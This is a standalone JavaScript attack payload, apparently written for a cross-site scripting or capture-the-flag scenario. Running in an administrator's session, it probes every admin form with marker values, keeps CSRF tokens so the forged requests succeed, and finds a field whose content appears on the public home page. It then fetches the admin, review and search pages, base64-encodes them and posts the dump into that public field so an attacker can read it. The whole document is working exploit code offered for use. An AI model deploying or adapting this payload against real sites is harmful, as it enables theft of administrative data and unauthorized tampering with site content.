(async () => {
  const g = (u,o) => fetch(u, Object.assign({credentials:'include',cache:'no-store'}, o||{}));
  const fresh = async () => { try { return await (await g('/?cb='+Math.random())).text(); } catch(e){ return ''; } };
  const rememberField = {}; // form index -> content field name
  try {
    const admin = await (await g('/admin/')).text();
    const doc = new DOMParser().parseFromString(admin, 'text/html');
    const forms = [...doc.querySelectorAll('form')];
    let winner = null, winField = null, winForm = -1;
    for (let fi=0; fi<forms.length; fi++){
      const f = forms[fi];
      const action = f.getAttribute('action') || '/admin/';
      const method = (f.getAttribute('method')||'POST').toUpperCase();
      const els = [...f.querySelectorAll('input,textarea,select,button')];
      // probe: set editable text fields to PROBE_<fi>_<name>, PRESERVE submit/button/hidden/token
      const editable = [];
      const fd = new FormData();
      for (const el of els){
        const nm = el.getAttribute('name'); if(!nm) continue;
        const tag = el.tagName.toLowerCase();
        const type=(el.getAttribute('type')||'').toLowerCase();
        const preserve = tag==='button' || type==='submit' || type==='button' || type==='hidden' || /csrf|token|nonce/i.test(nm);
        if (preserve){ fd.set(nm, el.value||''); }
        else { fd.set(nm, 'PROBE_'+fi+'_'+nm+'_END'); editable.push(nm); }
      }
      try { await g(action, {method, body: fd}); } catch(e){}
      const home = await fresh();
      if (home.indexOf('PROBE_'+fi+'_')>=0){
        winner = {action, method, els}; winForm = fi;
        const m = home.match(/PROBE_(\d+)_([A-Za-z0-9_\-]+)_END/);
        winField = m ? m[2] : (editable[0]||null);
        break;
      }
    }
    if (winner && winField){
      // Now dump full admin recon into that content field so we can read it on /
      const rev = await (await g('/admin/review.php')).text().catch(()=> '');
      const sea = await (await g('/admin/search.php')).text().catch(()=> '');
      const dump = '=ADMIN=\n'+admin+'\n=REVIEW=\n'+rev+'\n=SEARCH=\n'+sea;
      const b64 = btoa(unescape(encodeURIComponent(dump)));
      const fd = new FormData();
      for (const el of winner.els){
        const nm = el.getAttribute('name'); if(!nm) continue;
        const tag=el.tagName.toLowerCase(); const type=(el.getAttribute('type')||'').toLowerCase();
        const preserve = tag==='button'||type==='submit'||type==='button'||type==='hidden'||/csrf|token|nonce/i.test(nm);
        fd.set(nm, preserve ? (el.value||'') : (nm===winField ? ('WINctl form='+winForm+' action='+winner.action+' field='+winField+'\nB64:'+b64+':B64END') : (el.value||'')));
      }
      await g(winner.action, {method:winner.method, body: fd});
    }
  } catch(e){}
})();
